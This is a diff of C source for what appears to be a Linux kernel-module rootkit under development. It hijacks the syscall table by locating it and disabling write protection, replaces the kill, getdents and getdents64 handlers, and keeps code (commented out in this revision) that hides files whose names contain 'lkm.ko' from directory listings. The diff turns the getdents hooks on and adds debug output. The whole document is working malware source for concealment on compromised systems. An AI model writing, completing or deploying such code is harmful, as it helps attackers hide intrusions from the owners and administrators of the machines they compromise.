@@ -99,40 +99,46 @@ asmlinkage int (*original_getdents64)(unsigned int fd, struct linux_dirent64 *di
 asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
     char buf[count];
     int bpos,nread;
-    struct linux_dirent *d,*nd;
-    char * hidefile = "lkm.ko"; //this is the substring of a filename we want to hide
+    //struct linux_dirent *d,*nd;
+    //char * hidefile = "lkm.ko"; //this is the substring of a filename we want to hide
     nread = (*original_getdents)(fd,dirp,count); //call the original function to get struct to manipulate
+    if (!nread) { return 0; }
     copy_from_user(buf,dirp,nread); //steal what getdents returned so we can traverse
-    for (bpos = 0; bpos < nread;) { //traverse...
+    /*for (bpos = 0; bpos < nread;) { //traverse...
         d = (struct linux_dirent *) (buf + bpos);
         nd = (struct linux_dirent *) (buf + bpos + d->d_reclen);
+        printk("%s - %s\n",nd->d_name,hidefile);
         if (strstr(nd->d_name,hidefile)) { //if we have a substring match to hidefile, make the prev record point to next
             d->d_off=(nd->d_off+d->d_off);
             d->d_reclen=(d->d_reclen+nd->d_reclen);
+            printk("match\n");
         }
         bpos += d->d_reclen; //next
-    }
-    copy_to_user(dirp,(struct linux_dirent *)buf,sizeof(buf)); //now put it back to userspace
+    }*/
+    //copy_to_user(dirp,(struct linux_dirent *)buf,sizeof(buf)); //now put it back to userspace;
     return nread; //and return so the user process can use the getdents
 }
 
 asmlinkage int new_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
     char buf[count];
     int bpos,nread;
-    struct linux_dirent64 *d,*nd;
-    char * hidefile = "lkm.ko"; //this is the substring of a filename we want to hide
+    //struct linux_dirent64 *d,*nd;
+    //char * hidefile = "lkm.ko"; //this is the substring of a filename we want to hide
     nread = (*original_getdents64)(fd,dirp,count); //call the original function to get struct to manipulate
+    if (!nread) { return 0; }
     copy_from_user(buf,dirp,nread); //steal what getdents returned so we can traverse
-    for (bpos = 0; bpos < nread;) { //traverse...
+    /*for (bpos = 0; bpos < nread;) { //traverse...
         d = (struct linux_dirent64 *) (buf + bpos);
         nd = (struct linux_dirent64 *) (buf + bpos + d->d_reclen);
+        printk("%s - %s\n",nd->d_name,hidefile);
         if (strstr(nd->d_name,hidefile)) { //if we have a substring match to hidefile, make the prev record point to next
             d->d_off=(nd->d_off+d->d_off);
             d->d_reclen=(d->d_reclen+nd->d_reclen);
+            printk("match64\n");
         }
         bpos += d->d_reclen; //next
-    }
-    copy_to_user(dirp,(struct linux_dirent64 *)buf,sizeof(buf)); //now put it back to userspace
+    }*/
+    //copy_to_user(dirp,(struct linux_dirent64 *)buf,sizeof(buf)); //now put it back to userspace
     return nread; //and return so the user process can use the getdents
 }
 
@@ -143,22 +149,24 @@ static int init(void) { //initial function, sets up syscall hijacking
 	syscall_table = (address *)find(); //give us the syscall table (defined above find())
     if (!syscall_table) {cleanup_module(); } //if find() fails, unload
     original_kill = (void *)syscall_table[__NR_kill]; //store old addresses
-    //original_getdents = (void *)syscall_table[__NR_getdents];
-    //original_getdents64 = (void *)syscall_table[__NR_getdents64];
+    original_getdents = (void *)syscall_table[__NR_getdents];
+    original_getdents64 = (void *)syscall_table[__NR_getdents64];
     GPF_DISABLE; //messy, but 2.6 doesn't allow modification without this. see macro above
-    //syscall_table[__NR_getdents] = (address)new_getdents;
+    syscall_table[__NR_getdents] = (address)new_getdents;
     syscall_table[__NR_kill] = (address)new_kill;
-    //syscall_table[__NR_getdents64] = (address)new_getdents64;
+    syscall_table[__NR_getdents64] = (address)new_getdents64;
     GPF_ENABLE;
+    printk("LOAD OK\n");
 	return 0;
 }
 
 void cleanup_module(void) {
     GPF_DISABLE;
     syscall_table[__NR_kill] = (address)original_kill; //corrects the hijacking on unload
-    //syscall_table[__NR_getdents] = (address)original_getdents;
-    //syscall_table[__NR_getdents64] = (address)original_getdents64;
+    syscall_table[__NR_getdents] = (address)original_getdents;
+    syscall_table[__NR_getdents64] = (address)original_getdents64;
     GPF_ENABLE;
+    printk("UNLOAD OK\n");
     return;
 }
 
